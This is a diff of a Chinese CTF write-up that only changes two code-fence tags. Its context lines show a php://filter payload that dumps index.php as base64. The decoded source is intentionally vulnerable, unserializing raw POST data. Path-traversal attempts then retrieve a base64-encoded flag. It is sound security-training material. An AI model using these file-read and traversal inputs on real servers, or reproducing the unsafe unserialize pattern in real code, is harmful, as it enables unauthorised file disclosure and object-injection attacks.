@@ -125,7 +125,7 @@ echo urlencode(serialize($a));
 cmd="php://filter/read=convert.base64-encode/resource=index.php"
 
 在得到的数据包末尾发现base64数据
-```base64
+```txt
 PD9waHAKZXJyb3JfcmVwb3J0aW5nKDApOwpjbGFzcyBBIHsKICAgIHB1YmxpYyAkaGFuZGxlOwogICAgcHVibGljIGZ1bmN0aW9uIHRyaWdnZXJNZXRob2QoKSB7CiAgICAgICAgZWNobyAiIiAuICR0aGlzLT5oYW5kbGU7IAogICAgfQp9CmNsYXNzIEIgewogICAgcHVibGljICR3b3JrZXI7CiAgICBwdWJsaWMgJGNtZDsKICAgIHB1YmxpYyBmdW5jdGlvbiBfX3RvU3RyaW5nKCkgewogICAgICAgIHJldHVybiAkdGhpcy0+d29ya2VyLT5yZXN1bHQ7CiAgICB9Cn0KY2xhc3MgQyB7CiAgICBwdWJsaWMgJGNtZDsKICAgIHB1YmxpYyBmdW5jdGlvbiBfX2dldCgkbmFtZSkgewogICAgICAgIGVjaG8gZmlsZV9nZXRfY29udGVudHMoJHRoaXMtPmNtZCk7CiAgICB9Cn0KJHJhdyA9IGlzc2V0KCRfUE9TVFsnZGF0YSddKSA/ICRfUE9TVFsnZGF0YSddIDogJyc7CmhlYWRlcignQ29udGVudC1UeXBlOiBpbWFnZS9qcGVnJyk7CnJlYWRmaWxlKCJtdXp1amlqaWppLmpwZyIpOwpoaWdobGlnaHRfZmlsZShfX0ZJTEVfXyk7CiRvYmogPSB1bnNlcmlhbGl6ZSgkX1BPU1RbJ2RhdGEnXSk7CiRvYmotPnRyaWdnZXJNZXRob2QoKTs=
 ```
 解码
@@ -175,7 +175,7 @@ $obj->triggerMethod();
 对../../flag尝试  ——> 无数据返回
 对../../../flag尝试  ——>返回base64数据 数据如下
 
-```base64
+```txt
 ZmxhZ3szMWI5ZjQ4MS0yMmMzLTQzMjYtYjM3NS1jMGRiYmY2Nzc5N2N9
 ```
 解码得到flag
